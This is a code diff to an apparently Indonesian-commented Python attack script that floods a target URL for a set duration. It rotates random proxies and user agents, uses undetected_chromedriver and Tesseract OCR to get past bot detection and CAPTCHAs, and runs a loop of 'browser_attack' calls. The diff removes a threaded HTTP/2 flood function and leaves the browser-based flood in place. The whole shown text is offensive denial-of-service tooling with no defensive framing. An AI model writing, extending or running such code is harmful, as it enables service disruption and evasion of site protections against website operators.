@@ -10,12 +10,12 @@ import undetected_chromedriver as uc
 from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.service import Service
 from datetime import datetime
-import httpx
 import pytesseract
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver import ActionChains
+import requests
 
 # Konfigurasi Tesseract OCR (untuk CAPTCHA berbasis gambar)
 pytesseract.pytesseract.tesseract_cmd = r'/usr/bin/tesseract'  # Sesuaikan path Tesseract
@@ -155,43 +155,12 @@ def browser_attack(proxy, user_agent, target_url):
         format_output(proxy, user_agent, "", "", False)
         print(f"Error during browser attack: {e}")
 
-def http2_attack(target_url, proxy, user_agent):
-    headers = {
-        'User-Agent': user_agent,
-        'Content-Type': 'application/json'
-    }
-    proxies = {
-        'http://': f'http://{proxy}',
-        'https://': f'https://{proxy}'
-    }
-    
-    try:
-        # Using HTTP/2
-        with httpx.Client(http2=True, proxies=proxies) as client:
-            response = client.get(target_url, headers=headers)
-            if response.status_code == 200:
-                print(f"[HTTP/2] Request successful. Target URL: {target_url}")
-            else:
-                print(f"[HTTP/2] Failed request with status code: {response.status_code}")
-    except Exception as e:
-        print(f"[HTTP/2] Error during HTTP/2 attack: {e}")
-
-def combined_attack(proxy, user_agent, target_url):
-    browser_thread = Thread(target=browser_attack, args=(proxy, user_agent, target_url))
-    http2_thread = Thread(target=http2_attack, args=(target_url, proxy, user_agent))
-    
-    browser_thread.start()
-    http2_thread.start()
-    
-    browser_thread.join()
-    http2_thread.join()
-
 def start_attack(proxy_list, user_agent_list, target_url, duration):
     timeout = time.time() + duration
     while time.time() < timeout:
         proxy = random.choice(proxy_list)
         user_agent = random.choice(user_agent_list)
-        combined_attack(proxy, user_agent, target_url)
+        browser_attack(proxy, user_agent, target_url)
 
 # Check command-line arguments
 if len(sys.argv) != 6:
